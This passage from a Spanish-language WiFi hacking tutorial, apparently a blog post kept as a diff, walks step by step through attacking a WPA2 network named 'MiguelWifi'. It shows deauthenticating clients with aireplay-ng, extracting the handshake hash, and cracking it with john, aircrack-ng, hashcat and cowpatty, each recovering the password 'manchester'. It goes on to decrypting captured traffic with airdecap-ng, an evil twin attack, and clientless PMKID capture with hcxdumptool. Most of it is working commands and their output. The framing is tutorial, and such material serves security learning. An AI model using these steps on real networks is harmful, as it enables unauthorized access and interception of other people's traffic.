+37931 191.286318    Broadcast → c6:bf:fd:55:e2:f7 802.11 26 Deauthentication, <span class="nv">SN</span><span class="o">=</span>1015, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>........
+37933 191.290187 c6:bf:fd:55:e2:f7 → Broadcast    802.11 26 Deauthentication, <span class="nv">SN</span><span class="o">=</span>1016, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>........
+37934 191.290197    Broadcast → c6:bf:fd:55:e2:f7 802.11 26 Deauthentication, <span class="nv">SN</span><span class="o">=</span>1015, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>........
+37935 191.293178 c6:bf:fd:55:e2:f7 → Broadcast    802.11 26 Deauthentication, <span class="nv">SN</span><span class="o">=</span>1016, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>........
+</code></pre></div></div>
+
+<ul>
+  <li>Este es para filtrar por los paquetes de tipo <strong>Disassociate</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ tshark <span class="nt">-r</span> Captura-01.cap <span class="nt">-Y</span> <span class="s2">"wlan.fc.type_subtype==10"</span> 2&gt;/dev/null
+ 9879 137.777670 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 26 Disassociate, <span class="nv">SN</span><span class="o">=</span>3092, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>........
+ 9880 137.778488 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 26 Disassociate, <span class="nv">SN</span><span class="o">=</span>3092, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>....R...
+ 9881 137.779021 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 26 Disassociate, <span class="nv">SN</span><span class="o">=</span>3092, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>....R...
+ 9882 137.779431 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 26 Disassociate, <span class="nv">SN</span><span class="o">=</span>3092, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>....R...
+ 9883 137.780339 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 26 Disassociate, <span class="nv">SN</span><span class="o">=</span>3092, <span class="nv">FN</span><span class="o">=</span>0, <span class="nv">Flags</span><span class="o">=</span>....R...
+</code></pre></div></div>
+
+<ul>
+  <li>Este es para filtrar por los <strong>ACK</strong> este paquete se utiliza para confirmar que se ah recibido con éxito un segmento de datos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ tshark <span class="nt">-r</span> Captura-01.cap <span class="nt">-Y</span> <span class="s2">"wlan.fc.type_subtype==29"</span> 2&gt;/dev/null | <span class="nb">tail</span> <span class="nt">-n</span> 5
+39650 241.336497              → c6:bf:fd:55:e2:f7 <span class="o">(</span>c6:bf:fd:55:e2:f7<span class="o">)</span> <span class="o">(</span>RA<span class="o">)</span> 802.11 10 Acknowledgement, <span class="nv">Flags</span><span class="o">=</span>........
+39652 241.352849              → 1a:58:18:4e:8a:68 <span class="o">(</span>1a:58:18:4e:8a:68<span class="o">)</span> <span class="o">(</span>RA<span class="o">)</span> 802.11 10 Acknowledgement, <span class="nv">Flags</span><span class="o">=</span>........
+39656 241.673815              → Guangzho_d1:71:a4 <span class="o">(</span>bc:fa:b8:d1:71:a4<span class="o">)</span> <span class="o">(</span>RA<span class="o">)</span> 802.11 10 Acknowledgement, <span class="nv">Flags</span><span class="o">=</span>........
+39658 241.735049              → Guangzho_d1:71:a4 <span class="o">(</span>bc:fa:b8:d1:71:a4<span class="o">)</span> <span class="o">(</span>RA<span class="o">)</span> 802.11 10 Acknowledgement, <span class="nv">Flags</span><span class="o">=</span>........
+39660 241.995757              → HonHaiPr_48:6c:cf <span class="o">(</span>84:4b:f5:48:6c:cf<span class="o">)</span> <span class="o">(</span>RA<span class="o">)</span> 802.11 10 Acknowledgement, <span class="nv">Flags</span><span class="o">=</span>........
+</code></pre></div></div>
+
+<h2 id="extraccion-del-hash-en-el-handshake">Extraccion del Hash en el Handshake</h2>
+
+<ul>
+  <li>La herramienta <code class="language-plaintext highlighter-rouge">aircrack-ng</code> cuenta con un parámetro que nos va a ayudar a hacer todo esto.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ aircrack-ng <span class="nt">--help</span> | <span class="nb">grep </span>J
+      <span class="nt">-J</span> &lt;file&gt;  : create Hashcat file <span class="o">(</span>HCCAP<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Esto lo que hace es extraernos la información mas importante.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ aircrack-ng <span class="nt">-J</span> newcap Captura-01.cap
+Reading packets, please wait...
+Opening Captura-01.cap
+Read 39663 packets.
+
+   <span class="c">#  BSSID              ESSID                     Encryption</span>
+
+   1  C6:BF:FD:55:E2:F7  MiguelWifi                WPA <span class="o">(</span>1 handshake<span class="o">)</span>
+
+Choosing first network as target.
+
+Reading packets, please wait...
+Opening Captura-01.cap
+Read 39663 packets.
+
+1 potential targets
+
+
+
+Building Hashcat file...
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ESSID <span class="o">(</span>length: 10<span class="o">)</span>: MiguelWifi
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Key version: 2
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> BSSID: C6:BF:FD:55:E2:F7
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> STA: 1A:58:18:4E:8A:68
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> anonce:
+    72 7A C7 2C 11 C1 30 60 AA 8B 61 FD 40 8C 05 AC 
+    EC A2 CF D6 F6 73 4C 56 F4 8A 2E 75 4A F5 CA D3 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> snonce:
+    BA 4B AB 58 FC D9 87 16 2B DB BB BC A7 2B 48 7D 
+    F2 DA 9B F1 5B 3E 81 0F 44 D1 B6 B6 FF E9 7E EF 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Key MIC:
+    1A C0 6E C3 4B B6 91 93 E0 29 04 7C BA 1C 4A 35
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> eapol:
+    02 03 00 75 02 01 0A 00 10 00 00 00 00 00 00 00 
+    01 BA 4B AB 58 FC D9 87 16 2B DB BB BC A7 2B 48 
+    7D F2 DA 9B F1 5B 3E 81 0F 44 D1 B6 B6 FF E9 7E 
+    EF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+    00 00 16 30 14 01 00 00 0F AC 04 01 00 00 0F AC 
+    04 01 00 00 0F AC 02 0C 00 
+
+Successfully written to newcap.hccap
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora con <code class="language-plaintext highlighter-rouge">hccap2john</code> le vamos a pasar la captura que creamos y lo vamos a exportar a otro archivo que hay ya va a estar el hash final con la contraseña encriptada.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ hccap2john newcap.hccap <span class="o">&gt;</span> finalhash
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora si lo mostramos vamos a ver el <strong>hash</strong> de la red inlambrica.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>finalhash
+───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: finalhash
+───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ MiguelWifi:<span class="nv">$WPAPSK$MiguelWifi</span><span class="c">#lfzxJS9r4ZUMHcdciYifKDnNVlMfqviwdmh6TT9Oaz3PDc2DFB4qhjzdTixmSgQg2Q2kM8e9MTp.X.Kgv89DpjNnH</span>
+       │ 3PoWWtpGjL8ok61.5I0.Ec.2........../iYifKDnNVlMfqviwdmh6TT9Oaz3PDc2DFB4qhjzdTiw.........................................
+       │ ........................3X.I.E..1uk2.E..1uk2.E..1uk01..................................................................
+       │ .................................................................................................................../t..
+       │ ...U.../f.PgB9hd4Hs0Y2T9cQGXI:1a58184e8a68:c6bffd55e2f7:c6bffd55e2f7::WPA2:newcap.hccap
+───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</code></pre></div></div>
+
+<h1 id="fuerza-bruta-con-john">Fuerza bruta con John</h1>
+
+<ul>
+  <li>Para crackearla contraseña es muy fácil simplemente hacemos esto en mi caso usare el <code class="language-plaintext highlighter-rouge">rockyou.txt</code> ya que la contraseña esta en el diccionario.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt finalhash
+Warning: detected <span class="nb">hash type</span> <span class="s2">"wpapsk"</span>, but the string is also recognized as <span class="s2">"wpapsk-pmk"</span>
+Use the <span class="s2">"--format=wpapsk-pmk"</span> option to force loading these as that <span class="nb">type </span>instead
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>wpapsk, WPA/WPA2/PMF/PMKID PSK <span class="o">[</span>PBKDF2-SHA1 512/512 AVX512BW 16x]<span class="o">)</span>
+Cost 1 <span class="o">(</span>key version <span class="o">[</span>0:PMKID 1:WPA 2:WPA2 3:802.11w]<span class="o">)</span> is 2 <span class="k">for </span>all loaded hashes
+Will run 2 OpenMP threads
+Note: Minimum length forced to 2 by format
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+manchester       <span class="o">(</span>MiguelWifi<span class="o">)</span>
+1g 0:00:00:00 DONE <span class="o">(</span>2023-09-12 18:45<span class="o">)</span> 3.125g/s 1600p/s 1600c/s 1600C/s jeffrey..letmein
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed
+</code></pre></div></div>
+
+<h1 id="fuerza-bruta-con-aircrack-ng">Fuerza bruta con aircrack-ng</h1>
+
+<ul>
+  <li>Bueno también se puede hacer usando la propia herramienta <code class="language-plaintext highlighter-rouge">aircrack-ng</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ aircrack-ng <span class="nt">-w</span> /usr/share/wordlists/rockyou.txt Captura-01.cap
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+                               Aircrack-ng 1.6 
+
+      <span class="o">[</span>00:00:01] 435/10303727 keys tested <span class="o">(</span>587.39 k/s<span class="o">)</span> 
+
+      Time left: 4 hours, 52 minutes, 20 seconds                 0.00%
+
+                          KEY FOUND! <span class="o">[</span> manchester <span class="o">]</span>
+
+
+      Master Key     : 55 01 AE 01 39 05 DF 0B 58 9B EF 29 56 27 80 10 
+                       E0 DE D9 00 AD E5 62 96 0C 59 9B 1E 4A 0E B5 B7 
+
+      Transient Key  : 40 2F 55 3D 19 28 BD 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+
+      EAPOL HMAC     : 1A C0 6E C3 4B B6 91 93 E0 29 04 7C BA 1C 4A 35 
+</code></pre></div></div>
+
+<h1 id="fuerza-bruta-con-hashcat">Fuerza bruta con Hashcat</h1>
+
+<ul>
+  <li>Ahora lo haremos con <strong>Hashcat</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ hashcat <span class="nt">-h</span> | <span class="nb">grep</span> <span class="nt">-i</span> wpa
+   2500 | WPA-EAPOL-PBKDF2                                 | Network Protocols
+   2501 | WPA-EAPOL-PMK                                    | Network Protocols
+  22000 | WPA-PBKDF2-PMKID+EAPOL                           | Network Protocols
+  22001 | WPA-PMK-PMKID+EAPOL                              | Network Protocols
+  16800 | WPA-PMKID-PBKDF2                                 | Network Protocols
+  16801 | WPA-PMKID-PMK      
+</code></pre></div></div>
+
+<ul>
+  <li>La herramienta <code class="language-plaintext highlighter-rouge">aircrack-ng</code> cuenta con un parámetro para crear un archivo donde este el <strong>hash</strong> y <code class="language-plaintext highlighter-rouge">aircrack-ng</code> lo pueda <strong>crackear</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ aircrack-ng <span class="nt">--help</span> | <span class="nb">grep </span>j | <span class="nb">tail</span> <span class="nt">-n</span> 1
+      <span class="nt">-j</span> &lt;file&gt;  : create Hashcat v3.6+ file <span class="o">(</span>HCCAPX<span class="o">)</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ aircrack-ng <span class="nt">-j</span> hashcap Captura-01.cap
+Reading packets, please wait...
+Opening Captura-01.cap
+Read 39663 packets.
+
+   <span class="c">#  BSSID              ESSID                     Encryption</span>
+
+   1  C6:BF:FD:55:E2:F7  MiguelWifi                WPA <span class="o">(</span>1 handshake<span class="o">)</span>
+
+Choosing first network as target.
+
+Reading packets, please wait...
+Opening Captura-01.cap
+Read 39663 packets.
+
+1 potential targets
+
+
+
+Building Hashcat <span class="o">(</span>3.60+<span class="o">)</span> file...
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ESSID <span class="o">(</span>length: 10<span class="o">)</span>: MiguelWifi
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Key version: 2
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> BSSID: C6:BF:FD:55:E2:F7
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> STA: 1A:58:18:4E:8A:68
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> anonce:
+    72 7A C7 2C 11 C1 30 60 AA 8B 61 FD 40 8C 05 AC 
+    EC A2 CF D6 F6 73 4C 56 F4 8A 2E 75 4A F5 CA D3 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> snonce:
+    BA 4B AB 58 FC D9 87 16 2B DB BB BC A7 2B 48 7D 
+    F2 DA 9B F1 5B 3E 81 0F 44 D1 B6 B6 FF E9 7E EF 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Key MIC:
+    1A C0 6E C3 4B B6 91 93 E0 29 04 7C BA 1C 4A 35
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> eapol:
+    02 03 00 75 02 01 0A 00 10 00 00 00 00 00 00 00 
+    01 BA 4B AB 58 FC D9 87 16 2B DB BB BC A7 2B 48 
+    7D F2 DA 9B F1 5B 3E 81 0F 44 D1 B6 B6 FF E9 7E 
+    EF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+    00 00 16 30 14 01 00 00 0F AC 04 01 00 00 0F AC 
+    04 01 00 00 0F AC 02 0C 00 
+
+Successfully written to hashcap.hccapx
+</code></pre></div></div>
+
+<ul>
+  <li>Y ahora simplemente le indicamos el modo y el archivo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ hashcat <span class="nt">-m</span> 2500 <span class="nt">-d</span> 1 hashcap.hccapx /usr/share/wordlists/rockyou.txt <span class="nt">--force</span>
+hashcat <span class="o">(</span>v6.1.1<span class="o">)</span> starting...
+
+You have enabled <span class="nt">--force</span> to bypass dangerous warnings and errors!
+This can hide serious problems and should only be <span class="k">done </span>when debugging.
+Do not report hashcat issues encountered when using <span class="nt">--force</span><span class="nb">.</span>
+OpenCL API <span class="o">(</span>OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG<span class="o">)</span> - Platform <span class="c">#1 [The pocl project]</span>
+<span class="o">=============================================================================================================================</span>
+<span class="k">*</span> Device <span class="c">#1: pthread-Intel(R) Core(TM) i5-1035G1 CPU @ 1.00GHz, 2855/2919 MB (1024 MB allocatable), 2MCU</span>
+
+Minimum password length supported by kernel: 8
+Maximum password length supported by kernel: 63
+
+Hashes: 1 digests<span class="p">;</span> 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers applied:
+<span class="k">*</span> Zero-Byte
+<span class="k">*</span> Single-Hash
+<span class="k">*</span> Single-Salt
+<span class="k">*</span> Slow-Hash-SIMD-LOOP
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required <span class="k">for </span>this attack: 64 MB
+
+Dictionary cache built:
+<span class="k">*</span> Filename..: /usr/share/wordlists/rockyou.txt
+<span class="k">*</span> Passwords.: 14344392
+<span class="k">*</span> Bytes.....: 139921507
+<span class="k">*</span> Keyspace..: 14344385
+<span class="k">*</span> Runtime...: 3 secs
+
+c6bffd55e2f7:1a58184e8a68:MiguelWifi:manchester  
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: WPA-EAPOL-PBKDF2
+Hash.Target......: MiguelWifi <span class="o">(</span>AP:c6:bf:fd:55:e2:f7 STA:1a:58:18:4e:8a:68<span class="o">)</span>
+Time.Started.....: Tue Sep 12 19:02:01 2023, <span class="o">(</span>1 sec<span class="o">)</span>
+Time.Estimated...: Tue Sep 12 19:02:02 2023, <span class="o">(</span>0 secs<span class="o">)</span>
+Guess.Base.......: File <span class="o">(</span>/usr/share/wordlists/rockyou.txt<span class="o">)</span>
+Guess.Queue......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span>
+Speed.#1.........:     2044 H/s <span class="o">(</span>7.15ms<span class="o">)</span> @ Accel:1024 Loops:128 Thr:1 Vec:16
+Recovered........: 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests
+Progress.........: 6595/14344385 <span class="o">(</span>0.05%<span class="o">)</span>
+Rejected.........: 4547/6595 <span class="o">(</span>68.95%<span class="o">)</span>
+Restore.Point....: 0/14344385 <span class="o">(</span>0.00%<span class="o">)</span>
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: 123456789 -&gt; zaq12wsx
+
+Started: Tue Sep 12 19:01:04 2023
+Stopped: Tue Sep 12 19:02:03 2023
+</code></pre></div></div>
+
+<h1 id="cracking-cowpatty">Cracking cowpatty</h1>
+
+<ul>
+  <li>Estas es otra alternativa.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cowpatty <span class="nt">-f</span> /usr/share/wordlists/rockyou.txt <span class="nt">-r</span> Captura-01.cap <span class="nt">-s</span> MiguelWifi
+cowpatty 4.8 - WPA-PSK dictionary attack. &lt;jwright@hasborg.com&gt;
+
+Collected all necessary data to mount crack against WPA2/PSK passphrase.
+Starting dictionary attack.  Please be patient.
+
+The PSK is <span class="s2">"manchester"</span><span class="nb">.</span>
+
+128 passphrases tested <span class="k">in </span>0.27 seconds:  465.61 passphrases/second
+</code></pre></div></div>
+
+<h2 id="espionaje">Espionaje</h2>
+
+<ul>
+  <li>
+    <p>Bueno para poder entender todo esto vamos a comenzar capturando un <strong>handshake</strong>.</p>
+  </li>
+  <li>
+    <p>Vamos a ponernos otra vez monitoreando el <strong>AP</strong> y lo vamos a exportar a un fichero.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ airodump-ng <span class="nt">-w</span> Captura <span class="nt">--bssid</span> C6:BF:FD:55:E2:F7 <span class="nt">--channel</span> 1 wlan0mon 
+</code></pre></div></div>
+
+<ul>
+  <li>Hay vemos otra vez que hay un cliente.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/xd.png" />
+</p>
+
+<ul>
+  <li>Ahora vamos a expulsar al cliente de la red y esperamos a que se reconecte para obtener el <strong>Handshake</strong> en este caso voy a indicar la <strong>MAC</strong> del cliente para que mas rapido.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ aireplay-ng <span class="nt">-0</span> 0 <span class="nt">-e</span> MiguelWifi <span class="nt">-c</span> 84:4B:F5:48:6C:CF wlan0mon
+</code></pre></div></div>
+
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/xd1.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Si seguimos en escucha y desde el lado del cliente nos autenticamos a alguna pagina como <strong>facebook.com</strong> u alguna otra pensaremos que podríamos ver el trafico <strong>http</strong> y la respuesta es si se puede pero como va encriptado no podemos ver los paquetes para ver todo esto debes de generar un <strong>handshake</strong> previamente.</p>
+  </li>
+  <li>
+    <p>Pero para desencriptar una captura en base a una contraseña que proporciones.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ airdecap-ng <span class="nt">--help</span>
+
+  Airdecap-ng 1.6  - <span class="o">(</span>C<span class="o">)</span> 2006-2020 Thomas d<span class="s1">'Otreppe
+  https://www.aircrack-ng.org
+
+  usage: airdecap-ng [options] &lt;pcap file&gt;
+
+  Common options:
+      -l         : don'</span>t remove the 802.11 header
+      <span class="nt">-b</span> &lt;bssid&gt; : access point MAC address filter
+      <span class="nt">-e</span> &lt;essid&gt; : target network SSID
+      <span class="nt">-o</span> &lt;fname&gt; : output file <span class="k">for </span>decrypted packets <span class="o">(</span>default &lt;src&gt;-dec<span class="o">)</span>
+
+  WEP specific option:
+      <span class="nt">-w</span> &lt;key&gt;   : target network WEP key <span class="k">in </span>hex
+      <span class="nt">-c</span> &lt;fname&gt; : output file <span class="k">for </span>corrupted WEP packets <span class="o">(</span>default &lt;src&gt;-bad<span class="o">)</span>
+
+  WPA specific options:
+      <span class="nt">-p</span> &lt;pass&gt;  : target network WPA passphrase
+      <span class="nt">-k</span> &lt;pmk&gt;   : WPA Pairwise Master Key <span class="k">in </span>hex
+
+      <span class="nt">--help</span>     : Displays this usage screen
+
+  If your capture contains any WDS packet, you must specify the <span class="nt">-b</span>
+  option <span class="o">(</span>otherwise only packets destined to the AP will be decrypted<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Para usarla es fácil simplemente le indicamos la contraseña y la captura y como vemos se desencriptaron muchos paquetes.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ airdecap-ng <span class="nt">-e</span> MiguelWifi <span class="nt">-p</span> manchester Captura-02.cap
+Total number of stations seen           12
+Total number of packets <span class="nb">read        </span>168309
+Total number of WEP data packets         0
+Total number of WPA data packets      1087
+Number of plaintext data packets         0
+Number of decrypted WEP  packets         0
+Number of corrupted WEP  packets         0
+Number of decrypted WPA  packets       855
+Number of bad TKIP <span class="o">(</span>WPA<span class="o">)</span> packets         0
+Number of bad CCMP <span class="o">(</span>WPA<span class="o">)</span> packets         0
+</code></pre></div></div>
+
+<ul>
+  <li>Esto nos crea una nueva captura llamada <strong>Captura-02-dec.cap</strong> vemos que se emitio una respuesta que es de donde me intente conectar y dijo que la cuenta no existía.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ tshark <span class="nt">-r</span> Captura-02-dec.cap <span class="nt">-Y</span> <span class="s2">"http"</span> 2&gt;/dev/null
+    1   0.000000 142.250.177.3 → 192.168.43.202 OCSP 779 Response
+</code></pre></div></div>
+
+<ul>
+  <li>Y de esta forma podemos ver la estructura de la data.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ tshark <span class="nt">-r</span> Captura-03-dec.cap <span class="nt">-Y</span> <span class="s2">"http"</span> <span class="nt">-Tfields</span> <span class="nt">-e</span> tcp.payload 2&gt;/dev/null | xxd <span class="nt">-ps</span> <span class="nt">-r</span>
+HTTP/1.1 200 OK
+Server: scaffolding on HTTPServer2
+Content-Length: 472
+X-XSS-Protection: 0
+X-Frame-Options: SAMEORIGIN
+Date: Wed, 13 Sep 2023 01:42:59 GMT
+Cache-Control: public, max-age<span class="o">=</span>14400
+Content-Type: application/ocsp-response
+Age: 2054
+
+0
+0	<span class="k">*</span>H00%W<span class="k">*</span><span class="o">]</span>S20230912234636Z0t0r0J0	+PSCIA]e7nHcZ%W<span class="k">*</span><span class="o">]</span>SX7/#g20230912234636Z20230919224635Z0
+<span class="sb">`</span><span class="o">!</span><span class="s1">'vL)*ETOCZ),ź*bK72\QkļPxhT-+,:gq0aqs+gGaMXԚ"io*H^r^M&gt;м	E!gG$d#bg/n"jL@cu琲hnNoRjͩõM"c^k_#ѿm1#
+</span></code></pre></div></div>
+
+<ul>
+  <li>En dado caso si quisiéramos ver algo mas como el usuario y la contraseña de alguna pagina web donde se conecte el cliente podemos hacerlo simplemente es seguir en escuchar y hacer los mismos procesos en este caso yo no lo voy a hacer por que estoy fue a modo de ejemplo.</li>
+</ul>
+
+<h2 id="evil-twin-attack">Evil Twin Attack</h2>
+
+<ul>
+  <li>
+    <p>Este ataque nos permite obtener la contraseña de la red inalambrica pero de forma alternativa vamos a crear una <strong>fake</strong> <strong>AP</strong> que opere en el mismo canal para que el cliente se conecte al de nosotros usando una plantilla este ataque se puede hacer tanto manual como automatizado con alguna herramienta recomiendo estas <a href="https://github.com/D3Ext/WEF">https://github.com/D3Ext/WEF</a> y <a href="https://github.com/s4vitar/evilTrust">https://github.com/s4vitar/evilTrust</a>.</p>
+  </li>
+  <li>
+    <p>Una vez instalada la herramienta tenemos estos parámetros aqui te dejo un <strong>POST</strong> del propio creador de la herramienta <a href="https://d3ext.github.io/posts/Curso/#ataque-evil-twin">https://d3ext.github.io/posts/Curso/#ataque-evil-twin</a>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wef <span class="nt">-h</span>
+ __      _____ ___ 
+ <span class="se">\ \ </span>   / / __| __|
+  <span class="se">\ \/\/</span> /| _|| _| 
+   <span class="se">\_</span>/<span class="se">\_</span>/ |___|_|  
+
+<span class="o">[</span>WEF] Wi-Fi Exploitation Framework 1.2
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Interfaces:
+	br-9deedf958a2c
+	docker0
+	ens33
+
+Required parameters:
+	<span class="nt">-i</span>, <span class="nt">--interface</span><span class="o">)</span> 	The name of your network card interface <span class="k">in </span>managed mode
+
+Optional parameters:
+	<span class="nt">-v</span>, <span class="nt">--verbose</span><span class="o">)</span> 		Show more info during the attacks <span class="o">(</span>recommended<span class="o">)</span>
+	<span class="nt">-h</span>, <span class="nt">--help</span><span class="o">)</span> 		Show this <span class="nb">help </span>panel
+	<span class="nt">--version</span><span class="o">)</span> 		Print the version and <span class="nb">exit</span>
+	<span class="nt">-s</span><span class="o">)</span> 			Set tool language to spanish
+</code></pre></div></div>
+
+<ul>
+  <li>Si quieres aprender a hacerlo manual puedes ver los pasos aquí <a href="https://s4vitar.github.io/oswp-preparacion/#">https://s4vitar.github.io/oswp-preparacion/#</a>.</li>
+</ul>
+
+<blockquote>
+  <p>En algunos casos el <strong>Fake AP</strong> no va hacer estable ya que <code class="language-plaintext highlighter-rouge">airbase-ng</code> no genera puntos de acceso estables y usar una antena <strong>Alfa</strong> funciona por eso se usan mucho las herramientas automatizadas</p>
+</blockquote>
+
+<h2 id="ataques-a-redes-sin-clientes">Ataques a redes sin clientes</h2>
+
+<ul>
+  <li>Para este ataque no es necesario que allá clientes conectados al <strong>AP</strong> lo primero que vamos a hacer es usar <code class="language-plaintext highlighter-rouge">hcxdumptool</code> este ataque es muy fácil y rápido.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ hcxdumptool <span class="nt">-i</span> wlan0mon <span class="nt">-o</span> hola <span class="nt">--enable_status</span><span class="o">=</span>1
+initialization...
+warning: wlan0mon is probably a monitor interface
+interface is already <span class="k">in </span>monitor mode
+
+start capturing <span class="o">(</span>stop with ctrl+c<span class="o">)</span>
+NMEA 0183 SENTENCE........: N/A
+INTERFACE NAME............: wlan0mon
+INTERFACE HARDWARE MAC....: 9cefd5f91ec0
+DRIVER....................: rt2800usb
+DRIVER VERSION............: 6.1.0-1parrot1-amd64
+DRIVER FIRMWARE VERSION...: 0.36
+ERRORMAX..................: 100 errors
+BPF code blocks...........: 0
+FILTERLIST ACCESS POINT...: 0 entries
+FILTERLIST CLIENT.........: 0 entries
+FILTERMODE................: unused
+WEAK CANDIDATE............: 12345678
+ESSID list................: 0 entries
+ROGUE <span class="o">(</span>ACCESS POINT<span class="o">)</span>......: 0022f185deae <span class="o">(</span>BROADCAST HIDDEN<span class="o">)</span>
+ROGUE <span class="o">(</span>ACCESS POINT<span class="o">)</span>......: 0022f100deaf <span class="o">(</span>BROADCAST OPEN<span class="o">)</span>
+ROGUE <span class="o">(</span>ACCESS POINT<span class="o">)</span>......: 0022f185deb0 <span class="o">(</span>incremented on every new client<span class="o">)</span>
+ROGUE <span class="o">(</span>CLIENT<span class="o">)</span>............: f04f7cd3562f
+EAPOLTIMEOUT..............: 20000 usec
+REPLAYCOUNT...............: 61798
